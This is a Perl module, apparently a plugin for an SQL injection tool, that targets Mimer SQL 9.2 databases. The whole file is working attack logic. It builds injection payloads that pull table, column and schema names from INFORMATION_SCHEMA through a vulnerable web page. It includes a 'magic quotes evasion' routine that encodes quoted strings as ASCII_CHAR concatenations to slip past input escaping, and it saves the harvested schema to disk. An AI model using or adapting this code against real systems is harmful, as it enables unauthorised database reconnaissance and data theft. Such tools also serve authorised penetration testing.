package isr_mimer;
use Data::Dump qw(dump);

#Author: Francisco Amato

#Tested in mimer 9.2
my $version="9.2";

my @space=(' ',"\t");
#Atributos publicos

#Private variable
@db_errors = (
	    {
             'code'  	=>'',
             'message'  =>'',
             'type'     =>0
            }	    
	    );

my @col_testpage=('SQL_LANGUAGE_SOURCE','SQL_LANGUAGE_YEAR','SQL_LANGUAGE_CONFORMANCE');
my $name_test="INFORMATION_SCHEMA.sql_languages";
my $coltype_testpage={
  SQL_LANGUAGE_SOURCE => "character",
  status          => "character",
  name          => "character",
  createdate    => "character"
};
	
my @col_dbschema=('a.TABLE_SCHEMA','a.TABLE_NAME','a.COLUMN_NAME','a.DATA_TYPE');
my $name_dbschema="INFORMATION_SCHEMA.columns a inner join INFORMATION_SCHEMA.tables b on a.TABLE_NAME=b.TABLE_NAME";
my $name_dbschematail="b.table_type='BASE TABLE'";
my $coltype_dbschema={
  'a.TABLE_SCHEMA' => "character",
  'a.TABLE_NAME'          => "character",
  'a.COLUMN_NAME'          => "character",
  'a.DATA_TYPE'    => "character"
};


#Constructor y destructor de clase
sub new {
    my $classname = shift;
    my $class = {@_};

    #Atributos de instancia

    bless $class, $classname;
    return $class;
}

# Accessores y mutadores
sub get_testpage { my $class = shift; return $class->{testpage};}
sub get_dbschema { my $class = shift; return $class->{dbschema};}

#Public method
sub do_testpage {
    my $class = shift;
    $class->{testpage}=process_page($class,$name_test,$coltype_testpage,undef,undef,@col_testpage);
}

sub do_dbsnames {
    my $class = shift;
    $class->{error} = "Dbsnames not implement\n";
    $class->{dbsnames} = -1; # not implement
}


sub do_dbschema {
    my $class = shift;
    $class->{dbschema}=process_page($class,$name_dbschema,$coltype_dbschema,$name_dbschematail,undef,@col_dbschema);
    die "Error: " . $class->{error} if ($class->{error});
    
    open(FF, "> ./template/$class->{conn}->{'session'}.dbschema");
        print FF $class->get_dbschema;
    close(FF);
		    
}

#Private method
sub process_page{

    my ($class,$table,$coltype,$where,$tail,@col) = @_;
    my $datos=$class->{conn}->{'inj'};
    my $val;
    my @ncol;

    #convert all to str
    foreach(@col){
        if(uc($coltype->{$_}) =~ /^CHARACTER|CHAR|CHARACTER VARYING|CHAR VARYING|VARCHAR|CHARACTER LARGE OBJECT|CHAR LARGE OBJECT|CLOB|NATIONAL CHARACTER|NATIONAL CHAR|NCHAR|NATIONAL CHARACTER VARYING|NATIONAL CHAR VARYING|NCHAR VARYING|NVARCHAR|NATIONAL CHAR LARGE OBJECT|NCHAR LARGE OBJECT|NCLOB|NATIONAL CHARACTER LARGE OBJECT$/){
            push @ncol,$_;
        }else{
            push @ncol,"cast($_ as varchar(10000))";
        }
    }

    #select
    $val = &getconcat(@ncol);

    #where
    my $mwhere;
    if($where){ #exist structure where
        $mwhere = "where $where";
        if ($class->{conn}->{'where'}){ #user define where
            $mwhere .= " and $class->{conn}->{'where'}";
        }
    }elsif($class->{conn}->{'where'}){
        $mwhere="where $class->{conn}->{'where'}";
    }

    #tail
    my $mtail=$class->{conn}->{'tail'};

    
    $datos=~ s/\<VALUE\>/$val/gi;
    $datos=~ s/\<TABLE\>/$table/gi;
    $datos=~ s/\<WHERE\>/$mwhere/gi;    
    $datos=~ s/\<TAIL\>/$mtail/gi;

    #Magic quotes evasion
    $datos =~ s/'([^']+)'/magicquotes($1)/egi if $class->{conn}->{'magicquotes'}; #'
    
    $class->{lastinj}=$datos;
    $class->{conn}->getpage("",$datos);
    if ($class->{conn}->{code} == 404){
	$class->{error} = "Error 404\n";
    }else{
	$class->{error}=check_errors($class->{conn}->{response});
    }
    return $class->{conn}->{response};
}
sub magicquotes {
    my ($val) = @_;
    my @list= map { $_ = 'ASCII_CHAR('.$_.')' } unpack('C*', $val);
    my $return = &getconcat(@list);
    $return =~ s/\|\|'\[\_\_\]'\|\|/\|\|/gi;
    return $return;
}
		    

sub check_errors {
    my ($response) = @_;
    my $ret="";
    foreach my $item (@db_errors){
	if ($response =~ /$item->{'code'}/){
	    $ret.="Code: $item->{'code'}, Detail: $item->{'message'}\n";
	}
    }
    return $ret;
}

sub getconcat {
        my (@items) =@_;
        my $can=$#items;
        my $str=getvalue($items[0]);
        for (my $i=1;$i <=$can;$i++)
        {
                $str.= "||'[__]'||".getvalue($items[$i]);
        }
        return $str;
}

sub getvalue {
    my ($str) = @_;
    if ($str){
        return $str;
    }else{
        return "'".$str."'";
    }
}
1;
